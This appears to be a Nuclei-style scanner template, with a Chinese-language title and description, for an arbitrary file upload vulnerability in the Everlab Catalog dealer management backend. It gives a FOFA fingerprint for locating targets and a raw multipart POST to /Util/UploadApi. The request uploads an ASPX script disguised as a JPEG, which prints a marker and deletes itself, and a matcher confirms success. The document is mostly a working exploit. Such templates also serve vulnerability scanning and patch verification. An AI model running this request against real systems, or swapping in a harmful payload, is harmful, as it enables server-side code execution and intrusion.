id: everlab-catalog-dealer-backend-file-upload

info:
  name: "Everlab Catalog 经销商管理后台 UploadApi 文件上传漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: fid="eI+Xsoc7dLCgDaXFvOBCcg=="
      Everlab 云端实验室由北京库巴扎信息科技有限公司开发，定位为科研用户的信息化管理平台，提供实验室数据与工作流程的标准化解决方案。
  tags: Everlab

http:
- raw:
  - |
    POST /Util/UploadApi HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: multipart/form-data; boundary=---------------------------111
    Origin: null
    Connection: clos
    Upgrade-Insecure-Requests: 1

    -----------------------------111
    Content-Disposition: form-data; name="Filedata"; filename="NTest.aspx"
    Content-Type: image/jpeg

    <%@ Page Language="C#"%><% Response.Write("NdayTest");System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
    -----------------------------111--
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'NdayTest'
